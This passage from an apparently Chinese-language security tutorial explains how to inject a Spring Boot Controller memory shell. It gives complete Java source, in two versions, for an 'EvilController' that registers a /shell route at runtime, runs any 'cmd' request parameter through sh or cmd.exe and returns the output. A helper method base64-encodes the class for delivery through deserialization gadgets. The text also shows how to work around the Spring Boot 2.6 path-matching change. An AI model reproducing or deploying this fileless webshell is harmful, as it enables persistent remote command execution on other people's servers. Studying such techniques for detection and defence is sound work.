<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>最后调用 <code>RegistryMapping</code> 方法进行注册即可：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br></pre></td></tr></table></figure></div>

<p>完整代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取当前上下文环境</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//手动注册Controller</span></span><br><span class="line">            <span class="comment">//从上下文中获得 RequestMappingHandlerMapping</span></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="comment">//通过反射获得controller中的Method</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getDeclaredMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//定义controller的路径</span></span><br><span class="line">            <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">            <span class="comment">//定义访问controller的HTTP方法（GET/POST）</span></span><br><span class="line">            <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">            <span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            r.registerMapping(info, <span class="keyword">new</span> <span class="title class_">EvilController</span>(), method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(Repository.lookupClass(EvilController.class).getBytes());</span><br><span class="line">        System.out.println(b64.length());</span><br><span class="line">        System.out.println(b64);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然而上述代码从 Springboot 2.6.0 版本开始会产生如下报错：</p>
<blockquote>
<p>java.lang.IllegalArgumentException: Expected lookupPath in request attribute “org.springframework.web.util.UrlPathHelper.PATH”.</p>
</blockquote>
<p>原因在于从 Springboot 2.6.0 版本开始，官方修改了url路径的默认匹配策略，<a class="link"   target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.6-Release-Notes" >版本发布日志<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>部分如下：</p>
<blockquote>
<p>The default strategy for matching request paths against registered Spring MVC handler mappings has changed from AntPathMatcher to PathPatternParser.</p>
<p>Spring MVC 中，用于将请求路径与已注册的处理器映射（handler mapping）进行匹配的<strong>默认策略</strong>已从原来的 <code>AntPathMatcher</code> 更改为 <code>PathPatternParser</code>。</p>
</blockquote>
<p>如果在 Springboot 2.6.0 的环境下，通过 <code>application.properties</code> 配置文件设置 <code>spring.mvc.pathmatch.matching-strategy</code> 的值为 <code>ant_path_matcher</code>，即修改服务端的路径匹配策略为 <code>AntPathMatcher</code>，注入的 Controller 内存马后访问就没问题了。</p>
<div class="code-container" data-rel="Properties"><figure class="iseeu highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.mvc.pathmatch.matching-strategy</span>=<span class="string">ant_path_matcher</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>ant-path-matcher</code>&#x2F;<code>ant_path_matcher</code> 都能被 Boot 绑定，不用纠结连字符还是下划线。</p>
</blockquote>
<p>在 <code>AbstractHandlerMethodMapping#detectHandelrMethod()</code> 函数中，<code>methods</code> 是一个 map 对象，<code>Method</code> 对象作为键，相应的包含访问路径等信息的 <code>RequestMappingInfo</code> 对象作为值。最后遍历 <code>methods</code> 这个 map 集合，对每一项进行注册，即把每一个method、访问路径及 Controller 保存到 <code>AbstractHandlerMethodMapping.MappingRegistry</code> 对象中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3) 选择当前类中所有“有映射”的方法：</span></span><br><span class="line"><span class="comment">//    MethodIntrospector.selectMethods 会遍历 userType 的可检查方法，并通过 MetadataLookup 回调</span></span><br><span class="line"><span class="comment">//    为每个方法计算“映射信息 T”（子类定义的 T，例如 RequestMappingHandlerMapping 中是 RequestMappingInfo）。</span></span><br><span class="line">Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType,</span><br><span class="line">        (MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 3.1 计算该方法对应的映射信息（可能综合类级、方法级 @RequestMapping 及其它条件）</span></span><br><span class="line">                <span class="keyword">return</span> getMappingForMethod(method, userType);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">                <span class="comment">// 3.2 如果标注不合法或解析失败，抛出更明确的异常（包含类名与方法签名）</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid mapping on handler class [&quot;</span> +</span><br><span class="line">                        userType.getName() + <span class="string">&quot;]: &quot;</span> + method, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5) 对每个“有映射”的方法进行最终注册</span></span><br><span class="line">methods.forEach((method, mapping) -&gt; &#123;</span><br><span class="line">    <span class="comment">// 5.1 选择可调用的方法（考虑 AOP 代理、桥接方法/泛型擦除、接口方法到实现类方法的映射等）</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">invocableMethod</span> <span class="operator">=</span> AopUtils.selectInvocableMethod(method, userType);</span><br><span class="line">    <span class="comment">// 5.2 将 (handler, method, mapping) 注册到映射注册表（mappingRegistry）</span></span><br><span class="line">    <span class="comment">//     之后就能通过 URL/HTTP 方法等条件路由到该方法</span></span><br><span class="line">    registerHandlerMethod(handler, invocableMethod, mapping);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<p>再看一下 <code>methods</code> 里的每一项，作为 key 的 <code>Method</code> 对象很好理解，那作为 value 的 <code>RequestMappingInfo</code> 对象时如何创建的呢？</p>
<p>还是上面的代码，它是由 <code>RequestMappingHandlerMapping#getMappingForMethod()</code> 方法创建的，该方法又调用了  <code>RequestMappingInfo#createRequestMappingInfo(RequestMapping, RequestCondition)</code> 方法。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.createRequestMappingInfo(RequestMappingHandlerMapping.java:368)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.createRequestMappingInfo(RequestMappingHandlerMapping.java:324)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.getMappingForMethod(RequestMappingHandlerMapping.java:284)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.getMappingForMethod(RequestMappingHandlerMapping.java:76)</span><br></pre></td></tr></table></figure></div>

<p>来看一下 <code>createRequestMappingInfo(RequestMapping, RequestCondition)</code> 方法的实现：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基于给定的 &#123;<span class="doctag">@link</span> RequestMapping <span class="doctag">@RequestMapping</span>&#125; 注解创建一个 &#123;<span class="doctag">@link</span> RequestMappingInfo&#125;。</span></span><br><span class="line"><span class="comment"> * 这里的 <span class="doctag">@RequestMapping</span> 可能是：</span></span><br><span class="line"><span class="comment"> *  - 直接标在类/方法上的注解；</span></span><br><span class="line"><span class="comment"> *  - 作为元注解（meta-annotation）间接出现；</span></span><br><span class="line"><span class="comment"> *  - 由注解层级合并与别名解析后“合成”的结果（synthesized），例如 value 与 path 的别名统一。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> RequestMappingInfo <span class="title function_">createRequestMappingInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">        RequestMapping requestMapping, <span class="meta">@Nullable</span> RequestCondition&lt;?&gt; customCondition)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建器：把 @RequestMapping 上声明的各类匹配条件逐项写入</span></span><br><span class="line">    RequestMappingInfo.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">            <span class="comment">// 路径模式（支持占位符/环境变量），先对路径中嵌入的占位值做解析</span></span><br><span class="line">            .paths(resolveEmbeddedValuesInPatterns(requestMapping.path()))</span><br><span class="line">            <span class="comment">// HTTP 方法条件：GET/POST/PUT/DELETE/...</span></span><br><span class="line">            .methods(requestMapping.method())</span><br><span class="line">            <span class="comment">// 请求参数条件：如 params=&#123;&quot;a=1&quot;,&quot;b&quot;&#125; 等</span></span><br><span class="line">            .params(requestMapping.params())</span><br><span class="line">            <span class="comment">// Header 条件：如 headers=&#123;&quot;X-Req=1&quot;&#125; 等</span></span><br><span class="line">            .headers(requestMapping.headers())</span><br><span class="line">            <span class="comment">// 请求体消费类型：Content-Type 匹配，如 consumes=&quot;application/json&quot;</span></span><br><span class="line">            .consumes(requestMapping.consumes())</span><br><span class="line">            <span class="comment">// 响应生产类型：Accept/响应类型匹配，如 produces=&quot;application/json&quot;</span></span><br><span class="line">            .produces(requestMapping.produces())</span><br><span class="line">            <span class="comment">// 映射名称（可用于映射命名策略/链接到方法）</span></span><br><span class="line">            .mappingName(requestMapping.name());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义的额外匹配条件（由子类提供），例如自定义版本条件、租户条件等</span></span><br><span class="line">    <span class="keyword">if</span> (customCondition != <span class="literal">null</span>) &#123;</span><br><span class="line">        builder.customCondition(customCondition);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用当前 HandlerMapping 的配置项收尾（对齐路径匹配策略、是否使用 PathPattern、尾斜杠、矩阵变量等）</span></span><br><span class="line">    <span class="keyword">return</span> builder.options(<span class="built_in">this</span>.config).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以我们可以参照这段代码来得到 <code>RequestMappingInfo</code> 对象，实现更通用的 Controller 内存马。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getDeclaredMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> r.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span></span><br><span class="line">                    (RequestMappingInfo.BuilderConfiguration) configField.get(r);</span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            r.registerMapping(info, <span class="keyword">new</span> <span class="title class_">EvilController</span>(), method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(Repository.lookupClass(EvilController.class).getBytes());</span><br><span class="line">        System.out.println(b64.length());</span><br><span class="line">        System.out.println(b64);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>或者我们干脆直接调用 <code>RequestMappingHandlerMapping#getMappingForMethod()</code> 去获取 <code>RequestMappingInfo</code> 对象，不过实现时要注意两点：</p>
<ul>
<li><p><code>RequestMappingHandlerMapping#getMappingForMethod()</code> 方法本身并没有接收 <code>method</code> 对应的 url 路径，它会从 <code>method</code> 的 <code>@RequestMapping</code> 注解中获取 url 路径。如果这个 <code>method</code> 没有被 <code>@RequestMapping</code> 或其子类如 <code>@GetMapping</code>、<code>@PostMapping</code> 注解的话，是无法得到 <code>RequestMappingInfo</code> 对象的，得到的是 <code>null</code>。</p>
